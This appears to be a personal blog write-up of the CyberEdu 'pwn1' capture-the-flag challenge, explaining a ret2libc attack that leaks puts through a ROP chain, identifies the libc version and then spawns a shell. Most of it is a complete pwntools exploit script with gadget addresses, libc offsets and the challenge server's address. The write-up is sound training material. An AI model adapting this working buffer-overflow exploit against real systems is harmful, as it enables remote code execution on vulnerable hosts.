+++
date = '2026-05-01'
draft = false
title = 'CyberEdu pwn1 Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn"]
+++

## Challenge overview

This is just a regular pwn!

---

Again, no PIE, and classic ret2libc. Similar to [baby-rop](https://irinasusca.github.io/babyrop-writeup). 


## Identifying the vulnerabilities

I crafted a classic rop chain, and now we only need to find the libc version to finish it remotely. I'll assume it's the same as the challenge I mentioned above.

Running remotely though, only gave us 5 bytes of libc puts when we needed 6; So I assumed that the last one was null bytes. Tried all the possible libc offsets, that didn't work; But printing out the data read before our leak, it seemed to have a trailing space that was getting thrown out; an `0x20`. 

Then, first try, I found `libc6_2.31-0ubuntu9.10_amd64`.

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/main')
p=elf.process()

cyberedu = '35.246.235.205:31951'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#puts(s) -> s=got + .... + main again?

#gdb.attach(p, gdbscript="b * 0x401184")

puts_got = elf.got[b'puts']
puts_plt = elf.plt[b'puts']
main = 0x401156
#print(f"pciked up {hex(puts_plt)}")
pop_rdi_ret = 0x4011f3
ret = 0x40101a
#{'__libc_start_main': 4210672, '__gmon_start__': 4210680, 'puts': 4210712, 'gets': 4210720}
#bruh ... se blocheaza la x00 null bytes..
#nu merge ? Dc. anyways, facem noi propriul nostru puts(puts).

payload = b"A" * 128 + b"B"*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)
p.recvuntil(b"BBBBBBBB")
print(p.recv(5)) #found this through testing ; this should still be our input.
data = p.recv(6).strip()
print(data)
data = data.rjust(6, b"\x20")
val = u64(data.ljust(8, b"\x00"))
print(f"pciked up {hex(val)}")
#checked this - valid puts.

io_puts_offset = 0x084420
system_offset = 0x052290
binsh_offset = 0x1b45bd

libc = val - io_puts_offset
system = libc + system_offset
binsh = libc + binsh_offset

payload = b"A" * 128 + b"B"*8 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system) 
p.sendline(payload)
p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/pwn1.py)**.
